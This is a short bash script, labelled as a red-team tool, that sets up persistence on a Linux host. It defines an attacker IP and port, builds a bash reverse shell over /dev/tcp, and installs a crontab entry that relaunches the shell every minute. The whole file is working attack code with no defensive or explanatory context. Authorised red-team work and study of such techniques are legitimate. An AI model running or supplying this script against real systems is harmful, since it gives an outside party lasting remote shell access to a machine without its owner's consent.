#!/bin/bash

# Red Team - Persistence Setup with Cron

# Reverse shell command
ATTACKER_IP="192.168.1.100"
PORT="5555"
SHELL_CMD="/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"

# Create cron job to maintain persistence
echo "[+] Setting up persistence with cron..."
(crontab -l 2>/dev/null; echo "* * * * * $SHELL_CMD") | crontab -